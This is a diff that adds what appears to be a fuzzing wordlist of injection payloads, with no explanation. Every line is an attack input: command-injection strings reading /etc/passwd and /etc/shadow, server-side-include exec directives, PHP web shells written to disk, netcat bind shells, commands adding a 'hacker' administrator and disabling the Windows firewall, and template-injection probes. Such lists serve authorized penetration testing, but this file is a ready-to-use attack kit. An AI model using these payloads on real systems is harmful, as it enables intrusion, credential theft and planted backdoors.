@@ -1,0 +1,178 @@
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+a|id|
+a;id|
+a;id;
+a;id\n
+| id
+& id
+; id
+%0a id %0a
+`id`
+$;/usr/bin/id
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+at /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+%0Aid
+%0a id %0a
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+& dir
+&&dir
+&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+dir C:\
+| dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+| dir C:\Users
+; dir C:\Users
+& dir C:\Users
+&& dir C:\Users
+dir C:\Users
+echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+;echo '<script>alert(1)</script>'
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+& id
+&&id
+;id\n
+ifconfig
+| ifconfig
+; ifconfig
+& ifconfig
+&& ifconfig
+/index.html|id|
+ipconfig
+| ipconfig /all
+; ipconfig /all
+& ipconfig /all
+&& ipconfig /all
+ipconfig /all
+ls
+$(`ls`)
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+ls -l /
+| ls -laR /etc
+; ls -laR /etc
+& ls -laR /etc
+&& ls -laR /etc
+| ls -laR /var/www
+; ls -laR /var/www
+& ls -laR /var/www
+&& ls -laR /var/www
+| ls -l /etc/
+; ls -l /etc/
+& ls -l /etc/
+&& ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+| ls -l /home/*
+; ls -l /home/*
+& ls -l /home/*
+&& ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+| ls -l /tmp
+; ls -l /tmp
+& ls -l /tmp
+&& ls -l /tmp
+ls -l /tmp
+| ls -l /var/www/*
+; ls -l /var/www/*
+& ls -l /var/www/*
+&& ls -l /var/www/*
+ls -l /var/www/*
+\n
+\n/bin/ls -al\n
+| nc -lvvp 4444 -e /bin/sh|
+; nc -lvvp 4444 -e /bin/sh;
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+| net localgroup Administrators hacker /ADD
+; net localgroup Administrators hacker /ADD
+& net localgroup Administrators hacker /ADD
+&& net localgroup Administrators hacker /ADD
+net localgroup Administrators hacker /ADD
+| netsh firewall set opmode disable
+; netsh firewall set opmode disable
+& netsh firewall set opmode disable
+&& netsh firewall set opmode disable
+netsh firewall set opmode disable
+netstat
+;netstat -a;
+| netstat -an
+; netstat -an
+& netstat -an
+&& netstat -an
+netstat -an
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
